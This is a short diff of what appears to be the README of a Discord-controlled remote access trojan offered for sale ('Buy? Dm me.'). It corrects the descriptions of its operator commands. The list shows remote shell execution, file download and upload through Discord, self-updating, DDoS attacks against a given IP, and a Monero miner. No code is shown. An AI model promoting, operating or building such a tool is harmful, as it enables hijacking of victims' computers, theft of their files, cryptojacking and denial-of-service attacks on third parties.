@@ -19,10 +19,10 @@ https://discord.gg/vCdPTjD6rZ - Buy? Dm me.
 * !sessions                         # List open sessions
 * !exit                             # Close session
 * !shell < cmd >                    # Run command
-* !download < link >                # Upload file to Discord
-* !upload < link > < file_name >    # Download file
-* !update                           # Re-download rat and remove old
-* !update-script                    # Update the rat updater
+* !download < link >                # Download file
+* !upload < link > < file_name >    # Upload file to discord
+* !update                           # Re-download rat
+* !update-script < link >           # Update the rat updater
 * !ddos < ip >                      # Start DDoS Attack
 * !stop-ddos                        # Stop DDoS Attack
 * !miner < wallet >                 # Start Monero coin miner
